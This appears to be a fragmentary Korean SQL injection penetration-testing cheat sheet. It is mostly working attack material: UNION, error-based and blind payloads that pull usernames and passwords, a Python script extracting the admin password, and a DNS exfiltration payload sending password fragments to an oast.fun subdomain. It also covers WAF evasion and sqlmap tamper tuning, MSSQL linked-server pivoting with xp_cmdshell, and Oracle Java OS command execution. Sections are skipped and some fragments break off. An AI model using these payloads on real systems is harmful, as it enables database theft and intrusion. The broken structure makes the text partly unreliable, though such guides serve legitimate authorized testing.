2.5 탐지 신뢰도 높이기 (오탐 방지)
ℹ
화면이 똑같아 보여도 오탐(false positive)이 흔하다. 아래 기준으로 최소 2회 이상 재현되는지 반드시 확인할 것.
-- Boolean-Based: 화면이 비슷해 보일 때 응답 길이(Content-Length)까지 비교
참: 1' AND 1=1--   → Content-Length: 4213
거짓: 1' AND 1=2-- → Content-Length: 4198   (몇 바이트라도 차이 나면 유효한 채널)

-- Time-Based: 네트워크 지터/서버 부하로 인한 오탐 방지
1. 지연 없는 요청을 3~5회 보내 baseline 응답 시간 측정 (예: 평균 200ms)
2. SLEEP(5) 요청을 최소 2회 반복 → 매번 baseline+5초 근처로 나오는지 확인
3. 처음엔 SLEEP(2~3) 같은 짧은 지연으로 먼저 확인 후 SLEEP(10) 등으로 올려 재검증
4. 프록시/로드밸런서 구간의 큐잉 지연과 혼동하지 않도록 동일 조건에서 반복 테스트

UNION-Based SQLi

In-Band
언제 사용: 쿼리 결과가 화면에 직접 출력될 때
원래 쿼리에 UNION SELECT를 붙여 다른 테이블 데이터를 같은 출력 자리에 끼워 넣는 방식.
4.1 컬럼 수 파악 — ORDER BY (에러 기반)
-- 숫자를 1씩 올리다 에러가 나는 직전 숫자 = 컬럼 수
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--   -- 에러 발생 → 컬럼 수는 2개

-- URL 인코딩 버전 (GET 파라미터)
1'+ORDER+BY+1--
1'+ORDER+BY+2--
4.2 컬럼 수 파악 — UNION SELECT NULL (더 안정적)
-- NULL은 모든 데이터 타입과 호환되어 타입 오류 없이 테스트 가능
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--   -- 에러 없으면 컬럼 3개

-- Oracle은 FROM dual 필수
' UNION SELECT NULL FROM dual--
' UNION SELECT NULL,NULL FROM dual--
4.3 출력 위치 확인 (어느 컬럼이 화면에 뜨는가)
-- 더미 문자열로 각 자리 확인 (컬럼 2개 기준)
-1' UNION SELECT 'col1','col2'--
-- 화면: First name: col1 / Surname: col2  → 둘 다 출력됨

-- 3개 컬럼인 경우
-1' UNION SELECT 'col1','col2','col3'--

-- id=-1 처럼 존재하지 않는 값으로 원래 결과를 0건으로 만드는 게 핵심
-- → UNION 결과만 깔끔하게 출력됨
4.4 데이터 추출 전체 흐름
-- STEP 1: DB 이름
-1' UNION SELECT database(),NULL--            -- MySQL
-1' UNION SELECT current_database(),NULL--    -- PostgreSQL
-1' UNION SELECT DB_NAME(),NULL--             -- MSSQL
-1' UNION SELECT (SELECT name FROM v$database),NULL FROM dual-- -- Oracle

-- STEP 2: 테이블 목록
-1' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -- MySQL/PG/MSSQL
-1' UNION SELECT table_name,NULL FROM all_tables WHERE ROWNUM=1-- -- Oracle

-- STEP 3: 컬럼 목록
-1' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
-1' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -- Oracle

-- STEP 4: 데이터 추출
-1' UNION SELECT username,password FROM users--

-- STEP 5: 한 컬럼에 여러 값 합치기 (출력 자리가 1개일 때)
-1' UNION SELECT CONCAT(username,':',password),NULL FROM users--           -- MySQL
-1' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '\n'),NULL FROM users-- -- MySQL (전체)
-1' UNION SELECT username||':'||password,NULL FROM users--                 -- PostgreSQL/Oracle
-1' UNION SELECT username+':'+password,NULL FROM users--                   -- MSSQL

SELECT table_schema, table_name FROM information_schema.columns WHERE column_name='password'
SELECT table_schema, table_name FROM information_schema.columns WHERE column_name LIKE '%pass%'
05

Error-Based SQLi

In-Band
언제 사용: 에러 메시지 내용이 화면에 노출될 때
의도적으로 잘못된 XPath/타입 변환 에러를 유발해 에러 메시지 안에 쿼리 결과를 포함시키는 방식.
5.1 MySQL — extractvalue (권장)
-- 원리: extractvalue()의 XPath에 쿼리 결과를 넣으면
--        "XPATH syntax error: ':결과값'" 에러에 값이 포함됨
-- 0x3a = ':' (콜론) → XPath 오류 유발용 특수문자

-- DB 이름
1' AND extractvalue(rand(),concat(0x3a,database()))--
-- → XPATH syntax error: ':dvwa'

-- 버전
1' AND extractvalue(rand(),concat(0x3a,@@version))--

-- 현재 사용자
1' AND extractvalue(rand(),concat(0x3a,user()))--

-- 테이블 목록 (LIMIT으로 한 행씩 순회)
1' AND extractvalue(rand(),concat(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--
1' AND extractvalue(rand(),concat(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1,1)))--

-- 컬럼 목록
1' AND extractvalue(rand(),concat(0x3a,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))--

-- 데이터 추출
1' AND extractvalue(rand(),concat(0x3a,(SELECT concat(username,':',password) FROM users LIMIT 0,1)))--
⚠
extractvalue/updatexml은 결과를 32자로 잘라서 보여준다. 긴 값(해시 등)은 SUBSTRING(값,1,32), SUBSTRING(값,33,32)처럼 나눠서 여러 번 요청하거나, 길이 제한이 없는 5.3의 GROUP BY 중복키 기법을 사용할 것.
5.2 MySQL — updatexml (대안)
-- extractvalue와 동일한 원리, 대안으로 사용
1' AND updatexml(null,concat(0x3a,database()),null)--
1' AND updatexml(null,concat(0x3a,@@version),null)--
1' AND updatexml(null,concat(0x3a,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)),null)--
5.3 MySQL — GTID_SUBSET (길이 제한 없음, 8.0 포함 안정적)
-- 원리: GTID_SUBSET()의 인자가 "UUID:번호" 형식이 아니면
--       "ERROR 3064: Malformed GTID set specified '결과값'" 에러에 값이 그대로 노출됨
-- extractvalue/updatexml과 달리 32자 제한이 없고, MySQL 5.7.5 ~ 8.0 전반에서 안정적으로 동작

-- 취약점 확인
1' AND GTID_SUBSET(version(),1)--

-- DB 이름 / 버전 추출
1' AND GTID_SUBSET(@@version,1)--
1' AND GTID_SUBSET(database(),1)--

-- 데이터 추출 (긴 값에 특히 유리 — 해시 전체를 한 번에 추출 가능)
1' AND GTID_SUBSET((SELECT password FROM users LIMIT 0,1),1)--
1' AND GTID_SUBSET((SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),1)--
⚠
과거 널리 쓰이던 GROUP BY + floor(rand(0)*2) 중복키 에러 기법은 MySQL 5.6~5.7 옵티마이저 변경 이후 대부분 재현되지 않는다. 새 진단에는 위 GTID_SUBSET을, 구버전(5.5 이하) 대상에서만 참고용으로 GROUP BY 기법을 시도할 것.
5.4 PostgreSQL — CAST 타입 오류
-- 문자열을 int로 CAST → 에러에 실제값 포함
-- 에러: invalid input syntax for integer: "실제값"

1' AND 1=CAST((SELECT version()) AS int)--
1' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
1' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
5.5 MSSQL — 타입 변환 오류
-- 에러: Conversion failed when converting ... 'secret'

1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
1' AND 1=CONVERT(int,@@version)--
1' AND 1=CONVERT(int,DB_NAME())--
1' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--

Boolean-Based Blind SQLi

Blind
언제 사용: 성공/실패 반응만 다르고 데이터/에러가 화면에 없을 때
UNION 사용 안 함. AND/OR 조건 + substring 조합으로 한 글자씩 스무고개 방식으로 추측. 참이면 통과, 거짓이면 에러/빈화면 — 이 차이만으로 데이터를 역추적.

1' AND 1=2--    -- 거짓 (변화)

1 AND 1=2--

6.4 sort (컬럼명) 파라미터 공격 사례
컬럼명이 들어가는 자리는 표현식을 통째로 대체할 수 있어 가장 자유도가 높다. 조건에 따라 정렬 기준 컬럼을 바꿔치기하면, 에러 없이 화면에 보이는 행 순서 차이만으로 참/거짓을 판별할 수 있다 (WAF/로그 탐지에 덜 걸림). 
-- 정상 요청: ?sort=name&order=asc  →  ORDER BY name asc

-- ① 조용한 탐지/추출: 조건에 따라 정렬 기준 컬럼 자체를 바꿔치기 (에러 없음, 순서 차이로 판별)
?sort=(CASE WHEN (1=1) THEN name ELSE id END)&order=asc
-- → 참(1=1)이면 name 기준 정렬(정상), 거짓이면 id 기준 정렬(행 순서가 눈에 띄게 달라짐)

?sort=(CASE WHEN (substring(database(),1,1)='d') THEN name ELSE id END)&order=asc
-- → 목록의 정렬 순서가 name순인지 id순인지만 비교하면 참/거짓 판별 가능. 에러 로그를 안 남겨 스텔스에 유리.

-- ② 확실한 판별: 조건이 거짓일 때 강제 에러 유발 (눈으로 보기 애매할 때, DB 에러 메시지로 명확히 구분)
?sort=(CASE WHEN (1=1) THEN name ELSE (SELECT 1 UNION SELECT 2) END)&order=asc   -- 참: 정상
?sort=(CASE WHEN (1=2) THEN name ELSE (SELECT 1 UNION SELECT 2) END)&order=asc   -- 거짓: 에러 발생

-- ③ 데이터 추출 (비밀번호 첫 글자 확인 예시)
?sort=(CASE WHEN (substring((SELECT password FROM users LIMIT 1),1,1)='5') THEN name ELSE (SELECT 1 UNION SELECT 2) END)&order=asc

-- ④ Time-Based 버전 (화면 반응/에러 구분이 전혀 없을 때, MySQL 기준)
?sort=(SELECT CASE WHEN (substring(database(),1,1)='d') THEN name ELSE SLEEP(5) END)&order=asc
6.5 order (ASC/DESC 방향) 파라미터 공격 사례
order는 보통 asc/desc 문자열 하나만 검증하는 경우가 많은데, 검증이 "값이 asc/desc로 시작하는지"만 보고 뒷부분을 잘라내지 않는 화이트리스트라면 콤마로 정렬 키를 추가 삽입할 수 있다. 
-- 정상: ORDER BY name asc

-- 다중 정렬 키 추가 삽입 (MySQL/MSSQL/PostgreSQL/Oracle 모두 콤마로 다중 정렬 키 지원)
?order=asc,(CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)   -- 참: 정상
?order=asc,(CASE WHEN (1=2) THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)   -- 거짓: 에러

-- Time-Based (MySQL 기준)
?order=asc,(SELECT SLEEP(5))

-- 주의: "asc"/"desc" 값 전체를 화이트리스트로 완전 일치(==) 검증하는 경우 이 벡터는 막힌다

6.8 sqlmap이 막힐 때 — 수동 자동화 스크립트 (Python)
WAF가 sqlmap 특유의 User-Agent/패턴을 차단하거나, 로그인 세션·커스텀 헤더가 필요해 sqlmap 설정이 번거로울 때 직접 스크립트를 짜는 감각도 필요하다. 아래는 6.2의 "이진 탐색" 원리를 그대로 코드로 옮긴 최소 예시. 
import requests
import time

URL = "http://target.com/items"
TRUE_MARKER = "Welcome"   # 참일 때만 응답에 나타나는 문자열 (2.5절 참고 — 응답 길이 비교로 대체 가능)

def is_true(condition_sql):
    payload = f"1' AND ({condition_sql})--"
    r = requests.get(URL, params={"id": payload}, timeout=10)
    time.sleep(0.2)  # 서버 부하 방지 — 실전에서는 반드시 딜레이를 둘 것
    return TRUE_MARKER in r.text

def get_length(subquery):
    lo, hi = 0, 200
    while lo < hi:
        mid = (lo + hi) // 2
        if is_true(f"length(({subquery}))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo

def extract_char(subquery, pos):
    lo, hi = 32, 126   # 출력 가능 ASCII 범위
    while lo < hi:
        mid = (lo + hi) // 2
        if is_true(f"ascii(substring(({subquery}),{pos},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)

def extract(subquery):
    length = get_length(subquery)
    print(f"[+] 길이: {length}")
    result = ""
    for i in range(1, length + 1):
        result += extract_char(subquery, i)
        print(f"\r[+] 진행: {result}", end="", flush=True)
    print()
    return result

if __name__ == "__main__":
    extract("SELECT password FROM users WHERE username='admin'")

Blind
언제 사용: 화면 반응 차이가 전혀 없을 때

MySQL
기본 지연
SELECT SLEEP(5)
BENCHMARK(5000000, MD5('a'))
조건부 지연
IF([조건],SLEEP(5),0)
예시
1' AND IF(substring(database(),1,1)='d',SLEEP(5),0)--
MSSQL
기본 지연
WAITFOR DELAY '0:0:5'
조건부 지연
IF ([조건]) WAITFOR DELAY '0:0:5'
예시
1'; IF (substring(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--
PostgreSQL
기본 지연
SELECT pg_sleep(5)
조건부 지연
CASE WHEN ([조건]) THEN pg_sleep(5) ELSE pg_sleep(0) END
pg_sleep 차단 시
SELECT count(*) FROM generate_series(1,10000000)
Oracle
기본 지연
DBMS_PIPE.RECEIVE_MESSAGE('a',5)
조건부 지연
CASE WHEN ([조건]) THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE NULL END

interactsh(오픈소스, Burp 라이선스 불필요): 터미널에서 interactsh-client 실행 → 고유 서브도메인 발급(예: abc123.oast.fun)
2
발급받은 도메인을 페이로드에 삽입
8.1~8.4의 attacker.com 자리를 발급받은 도메인으로 교체 후 요청 전송
3
상호작용(interaction) 확인
Burp Collaborator client의 "Poll now" 클릭, 또는 interactsh-client 터미널에 실시간으로 찍히는 DNS/HTTP 로그 확인. 상호작용이 찍히면 SQLi 확정.
4

유출할 값을 서브도메인 자리에 실어 보내면, 로그에 찍히는 서브도메인 문자열 자체가 결과값이 된다.

SELECT LOAD_FILE(CONCAT('\\\\',(SELECT SUBSTRING(password,1,8) FROM users LIMIT 1),'.abc123.oast.fun\\a'))

WAF 우회 기법

우회
WAF(Web Application Firewall)가 키워드/패턴 기반으로 차단할 때 사용하는 우회 기법들. 여러 기법을 조합하면 더 효과적.
12.0 우회 전에 — WAF 벤더부터 식별
벤더마다 막는 패턴/우회 난이도가 다르다. 무작정 우회 기법을 시도하기 전에 어떤 WAF인지부터 확인하면 시행착오를 크게 줄일 수 있다 — "감각"은 결국 여기서 갈린다.
WAF식별 단서
Cloudflare응답 헤더 cf-ray, cf-cache-status; 차단 시 특유의 "Attention Required!" challenge 페이지
AWS WAF차단 시 x-amzn-RequestId 헤더 + 일반적인 403 텍스트("Request blocked" 등, 커스터마이즈 가능)
F5 BIG-IP ASM쿠키 이름이 TS로 시작(TS0123abcd=...), 차단 페이지에 "The requested URL was rejected" 문구
Imperva Incapsula쿠키 incap_ses_*, visid_incap_*
Akamai헤더 akamai-x-cache 등 (환경별로 다름), CDN 자체에서 1차 차단되는 경우 많음
ModSecurity (OWASP CRS)기본 룰셋의 403 응답에 "Mod_Security" 관련 문구가 남아있는 경우가 종종 있음(설정에 따라 다름)
 
# sqlmap으로 WAF/IPS 자동 식별
sqlmap -u "http://target.com/?id=1" --identify-waf

# 응답 헤더/쿠키 직접 확인 (curl)
curl -sI "http://target.com/?id=1'"
💡 벤더를 알면 그 벤더의 우회 기법을 검색해서 12.1~12.7보다 훨씬 정확한 우회를 시도할 수 있다 (예: Cloudflare는 인코딩 우회에, ModSecurity CRS는 특정 룰 ID 우회에 강점이 있음).

14.3 MSSQL — 링크서버(Linked Server) 악용
조직 내부에서 DB 서버끼리 신뢰 관계(Linked Server)로 연결된 경우, 인젝션이 발생한 서버를 발판 삼아 직접 접근 불가능한 내부망 DB 서버까지 쿼리/명령 실행이 가능하다. 대규모 내부망 침투 시 핵심 기법. 
-- 1단계: 연결된(신뢰) 서버 목록 확인
SELECT srvname, srvproduct, providername FROM master..sysservers

-- 2단계: OPENQUERY로 링크서버에 원격 쿼리 실행
SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT @@version')
SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT name FROM master..syslogins')

-- 3단계: 링크서버 체이닝 — 격리된 내부망 서버까지 순차 접근
SELECT * FROM OPENQUERY([LINKED_SERVER_NAME], 'SELECT * FROM OPENQUERY([INTERNAL_SERVER], ''SELECT @@version'')')

-- 4단계: 링크서버 대상 원격 명령 실행 (xp_cmdshell이 원격 서버에서 활성화된 경우)
EXEC ('master..xp_cmdshell ''whoami''') AT [LINKED_SERVER_NAME]

14.4 Oracle — Java 저장 프로시저 명령 실행 (10g/11g, 레거시/CTF 위주)
Oracle은 UTL_HTTP/UTL_INADDR(OOB)와 별개로 Java 저장 프로시저를 통한 직접 OS 명령 실행 경로가 존재하지만, 아래 기법은 10g/11g 시절 PUBLIC이 관련 패키지에 EXECUTE 권한을 가지고 있던 설정 취약점을 이용한 것 — 사실상 레거시/CTF용이며 실서비스에서 마주칠 확률은 낮다. 
-- 사전 확인: 현재 계정이 DBMS_JAVA_TEST/DBMS_JAVA 관련 실행 권한을 가지고 있는지
SELECT * FROM session_privs WHERE privilege LIKE '%JAVA%'
SELECT * FROM user_tab_privs WHERE table_name IN ('DBMS_JAVA_TEST','DBMS_JAVA') AND privilege='EXECUTE'

-- Oracle 10gR2/11gR1/11gR2 — DBMS_JAVA_TEST.FUNCALL로 OS 명령 실행 (내장 Wrapper 클래스 사용)
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/sh','-c','id > /tmp/out') FROM dual

SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper main /bin/sh -c id') FROM dual

15.5 sqlmap이 기본 옵션으로 안 잡힐 때 — 실전 튜닝
"sqlmap 돌렸는데 취약점이 없다고 나온다"는 실전에서 가장 흔한 오판이다. 대부분 아래 옵션 중 하나가 원인이다. 이 튜닝 감각이 초급과 실무자를 가르는 지점. 
# ① Boolean Blind 판별 기준이 애매해서 실패하는 경우 → 참/거짓 기준을 직접 지정
sqlmap -u "http://target.com/?id=1" --string="Welcome"      # 이 문자열이 있으면 참으로 간주
sqlmap -u "http://target.com/?id=1" --not-string="Error"    # 이 문자열이 있으면 거짓으로 간주
sqlmap -u "http://target.com/?id=1" --code=200               # HTTP 상태코드로 참/거짓 판별

# ② Second-Order SQLi — 페이로드를 넣는 곳과 결과를 확인하는 곳이 다를 때 (11번 섹션)
sqlmap -u "http://target.com/register" --data="username=test&pass=test" --second-url="http://target.com/profile"

# ③ 자동 탐지가 컨텍스트를 잘못 짚을 때 — 페이로드 앞뒤를 직접 지정
#    (예: 파라미터가 이미 괄호 2개 안에 들어가는 구조라 자동 tamper로는 못 뚫을 때)
sqlmap -u "http://target.com/?id=1" --prefix="))" --suffix="-- -"

# ④ CSRF 토큰이 있는 로그인/폼 — 토큰 파라미터명을 지정하면 매 요청마다 자동으로 새로 받아옴
sqlmap -u "http://target.com/login" --data="user=a&pass=b&csrf=x" --csrf-token="csrf"

# ⑤ WAF가 sqlmap 시그니처(User-Agent, 특정 패턴)를 차단할 때
sqlmap -u "http://target.com/?id=1" --identify-waf                              # 먼저 WAF 종류 확인 (12.0 참고)
sqlmap -u "http://target.com/?id=1" --random-agent --tamper=space2comment,between,randomcase

# ⑥ 커스텀 tamper 스크립트 — 기존 tamper 조합으로도 안 뚫릴 때 직접 작성
#    ~/.local/share/sqlmap/tamper/mytamper.py 에 dependencies()/tamper(payload, **kwargs) 구현 후:
sqlmap -u "http://target.com/?id=1" --tamper=mytamper

# ⑦ 세션/타이밍 꼬임으로 재현이 안 될 때 — 캐시 초기화 + 매 요청 새 페이로드
sqlmap -u "http://target.com/?id=1" --flush-session --fresh-queries

# ⑧ Time-Based가 네트워크 지연 때문에 오탐될 때 — 임계값(초) 직접 조정
sqlmap -u "http://target.com/?id=1" --technique=T --time-sec=10
💡 ①②는 정확도 문제, ③④는 요청 구조 문제, ⑤⑥은 WAF 문제, ⑦⑧은 안정성 문제 — sqlmap이 실패하면 이 네 범주 중 어디에 해당하는지부터 구분하는 것이 디버깅의 핵심.

Nuclei 템플릿 활용

대량 스캔
sqlmap이 "1개 URL을 깊게" 판다면, Nuclei는 수백~수천 개 URL에 동일 패턴을 빠르게 스크리닝하는 용도. 리컨(정찰) 단계에서 넓게 훑어 후보를 추리고, 걸린 URL만 sqlmap/수동으로 깊게 파는 게 실전 순서.
17.1 기본 사용법 — 기존 템플릿으로 SQLi 태그 스캔
# 템플릿 최신화 (반드시 먼저)
nuclei -update-templates

# sqli 태그가 붙은 공식 템플릿(주로 특정 제품의 알려진 CVE)만 골라 실행
nuclei -u https://target.com -tags sqli

# URL 목록 전체 대상 + 심각도 필터
nuclei -l urls.txt -tags sqli -severity high,critical

# 리컨 파이프라인과 연계 (하위도메인 → 생존확인 → 크롤링 → 파라미터 필터 → 스캔)
subfinder -d target.com -silent | httpx -silent | katana -silent -jc | gf sqli | nuclei -t sqli-time-blind.yaml
ℹ
gf(tomnomnom/gf) 자체에는 sqli 패턴이 기본 포함되어 있지 않다 — 별도로 패턴 저장소(예: 1ndianl33t/Gf-Patterns)를 ~/.gf에 내려받아야 gf sqli 명령이 id, cat, category, item, page 등 인젝션 가능성이 높은 파라미터 이름만 걸러준다 — 무작정 전체 URL을 스캔하는 것보다 신호 대비 잡음을 크게 줄여준다.
17.2 커스텀 템플릿 작성 — Time-Based Blind 자동 탐지
공식 SQLi 템플릿은 대부분 "특정 제품의 알려진 취약점"용이라 커스텀 앱에는 안 맞는다. 범용 탐지는 직접 짜야 한다. 
id: custom-time-based-sqli

info:
  name: Generic Time-Based Blind SQL Injection
  author: internal-pentest
  severity: high
  tags: sqli,dast,blind

http:
  - raw:
      - |
        GET /?{{param}}=1 HTTP/1.1
        Host: {{Hostname}}

    fuzzing:
      - part: query          # 쿼리스트링 파라미터 값에 대해
        type: postfix         # 기존 값 뒤에 페이로드를 덧붙임
        mode: single           # 파라미터 하나씩 순차 테스트
        fuzz:
          - "' AND SLEEP(5)-- -"
          - "' AND SLEEP(5) AND '1'='1"
          - " AND SLEEP(5)-- -"
          - "; WAITFOR DELAY '0:0:5'--"
          - "' AND pg_sleep(5)-- -"

    matchers:
      - type: dsl
        dsl:
          - "duration>=5"      # 응답이 5초 이상 걸리면 취약으로 판정
# 작성한 템플릿 실행 (디버그 모드로 실제 요청/응답 확인)
nuclei -u "https://target.com/items?id=1" -t custom-time-based-sqli.yaml -debug

# 여러 대상에 동시 실행 + 동시성 조절 (과도한 요청으로 서버 부하 주지 않도록)
nuclei -l urls.txt -t custom-time-based-sqli.yaml -c 10 -rate-limit 20
⚠
Nuclei 버전에 따라 fuzzing: 블록 문법이 조금씩 바뀌었다(v3에서 도입/개선). 실행 전 nuclei -version 확인 후 공식 문서의 최신 fuzzing 문법과 대조할 것.

# SLEEP(5) 요청과 SLEEP(0) 요청을 둘 다 보내 "정상 응답시간 대비 상대적 지연"으로 판정
# → 원래 느린 서버/엔드포인트에서의 오탐(2.5절과 동일한 원리)을 줄임

def queueRequests(target, wordlists):

    engine.queue(target.req, "1")
